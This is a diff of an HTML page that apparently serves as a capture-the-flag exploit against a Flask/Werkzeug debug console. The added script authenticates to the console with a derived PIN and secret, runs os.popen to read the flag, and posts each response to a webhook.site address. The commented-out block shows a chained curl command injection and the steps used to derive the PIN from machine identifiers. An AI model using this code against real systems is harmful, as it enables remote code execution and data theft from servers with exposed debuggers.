@@ -7,53 +7,78 @@
 <body>
     <img src='https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2'>
 <script>
-(async () => {
-    try {
-        // 1. Send request to local Flask curl endpoint
-        const res = await fetch("http://localhost:8001/curl", {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "cmd=localhost:8001/console?__debugger__=yes\&cmd=pinauth\&pin=428-075-344\&s=fpXORGH7hJFyNGlMLUqH  | curl http://localhost:8001/console?__debugger__=yes\&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29\&frm=0\&s=fpXORGH7hJFyNGlMLUqH | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
+// (async () => {
+//     try {
+//         // 1. Send request to local Flask curl endpoint
+//         const res = await fetch("http://localhost:8001/curl", {
+//             method: "POST",
+//             headers: { "Content-Type": "application/x-www-form-urlencoded" },
+//             body: "cmd=localhost:8001/console?__debugger__=yes\&cmd=pinauth\&pin=428-075-344\&s=fpXORGH7hJFyNGlMLUqH  | curl http://localhost:8001/console?__debugger__=yes\&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29\&frm=0\&s=fpXORGH7hJFyNGlMLUqH | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
 
-            //STEP 1 /proc/net/arp
+//             //STEP 1 /proc/net/arp
 
-            //IP address       HW type     Flags       HW address            Mask     Device
-            //10.254.0.5       0x1         0x2         c6:23:fc:cf:c3:ff     *        eth0
-            //169.254.169.254  0x1         0x2         06:01:23:45:67:01     *        eth0
+//             //IP address       HW type     Flags       HW address            Mask     Device
+//             //10.254.0.5       0x1         0x2         c6:23:fc:cf:c3:ff     *        eth0
+//             //169.254.169.254  0x1         0x2         06:01:23:45:67:01     *        eth0
 
-            //STEP 2 /sys/class/net/eth0/address 
+//             //STEP 2 /sys/class/net/eth0/address 
 
-            //aa:fc:00:00:01:01
+//             //aa:fc:00:00:01:01
 
-            //187999308480769
+//             //187999308480769
 
-            //STEP 3 /etc/machine-id
+//             //STEP 3 /etc/machine-id
 
-            //a9d6384a4da44fb9b80f8a1f00c4a453
+//             //a9d6384a4da44fb9b80f8a1f00c4a453
 
-            //By running the exploit script we get pin as 428-075-344
+//             //By running the exploit script we get pin as 428-075-344
 
-            //Step 4 notice the secret which can be used as s as fpXORGH7hJFyNGlMLUqH
+//             //Step 4 notice the secret which can be used as s as fpXORGH7hJFyNGlMLUqH
 
-            // URL is http://localhost:8001/console?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH
+//             // URL is http://localhost:8001/console?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH
 
-            //flag http://localhost:8001/console?__debugger__=yes&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29&frm=0&s=fpXORGH7hJFyNGlMLUqH
+//             //flag http://localhost:8001/console?__debugger__=yes&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29&frm=0&s=fpXORGH7hJFyNGlMLUqH
 
-        });
-        const data = await res.text();
+//         });
+//         const data = await res.text();
 
-        // 2. Forward response to your webhook
-        await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
-            method: "POST",
-            headers: { "Content-Type": "text/plain" },
-            body: data
-        });
+//         // 2. Forward response to your webhook
+//         await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
+//             method: "POST",
+//             headers: { "Content-Type": "text/plain" },
+//             body: data
+//         });
 
-        console.log("Response forwarded successfully!");
-    } catch (err) {
-        console.error(err);
-    }
-})();
+//         console.log("Response forwarded successfully!");
+//     } catch (err) {
+//         console.error(err);
+//     }
+// })();
+
+
+async function run() {
+  const urls = [
+    "http://localhost:8001/console?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH",
+    "http://localhost:8001/console?__debugger__=yes&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29&frm=0&s=fpXORGH7hJFyNGlMLUqH"
+  ];
+
+  for (const url of urls) {
+    const resp = await fetch(url, {
+      credentials: "include"   // ensures cookies/session are sent
+    });
+    const text = await resp.text();
+
+    // forward the response to your webhook
+    await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: text
+    });
+  }
+}
+
+run();
 </script>
+
 </body>
 </html>
